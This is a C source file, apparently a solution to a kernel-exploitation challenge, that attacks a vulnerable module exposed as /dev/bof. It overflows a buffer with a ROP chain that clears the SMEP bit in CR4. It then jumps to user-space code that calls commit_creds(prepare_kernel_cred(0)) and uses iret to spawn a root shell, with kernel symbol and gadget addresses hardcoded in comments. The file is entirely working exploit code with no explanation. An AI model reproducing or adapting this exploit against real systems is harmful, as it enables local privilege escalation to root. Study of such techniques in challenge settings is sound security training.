// ch39 1359 0 - Live 0xc47fe000 (O)
// c1070e80 T commit_creds
// c10711f0 T prepare_kernel_cred

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <stdint.h>
struct trap_frame{
    void *eip;
    uint32_t cs;
    uint32_t eflags;
    void *esp;
    uint32_t ss;
}__attribute__((packed));
struct trap_frame tf;
void get_shell(void){
    execl("/bin/sh", "sh", NULL);
}
void init_tf_work(void){
    asm("pushl %cs;popl tf+4;"    //set cs
        "pushfl;popl tf+8;"       //set eflags
        "pushl %esp;popl tf+12;"
        "pushl %ss;popl tf+16;");
    tf.eip = &get_shell;
    tf.esp -= 1024;
}
#define KERNCALL __attribute__((regparm(3)))
void* (*prepare_kernel_cred)(void*) KERNCALL = (void*) 0xc10711f0;
void* (*commit_creds)(void*) KERNCALL = (void*) 0xc1070e80;
void payload(void){
    commit_creds(prepare_kernel_cred(0));
    asm("mov $tf,%esp;"
          "iret;");
}


int main(){
    init_tf_work();
    int buf[0x100] = {0};
    int i = 0;
    int fd = open("/dev/bof", O_RDWR);
    for(i = 0; i < 10; i++)
    {
        buf[i] = 0xdeadbeef;
    }

    buf[10] = 0xc10174fc;
    buf[11] = 0x6d0;
    buf[12] = 0xc1045053;
    buf[13] = 0xdeadbeef;

    for(i = 14; i < 20; i++)
    {
        buf[i] = &payload;
    }

    write(fd, buf, 20 * 4);
    return 0;
}

// 0xc1045053: mov cr4, eax; pop ebp; ret;
// 0xc10174fc: pop eax; ret;
// 0x6d0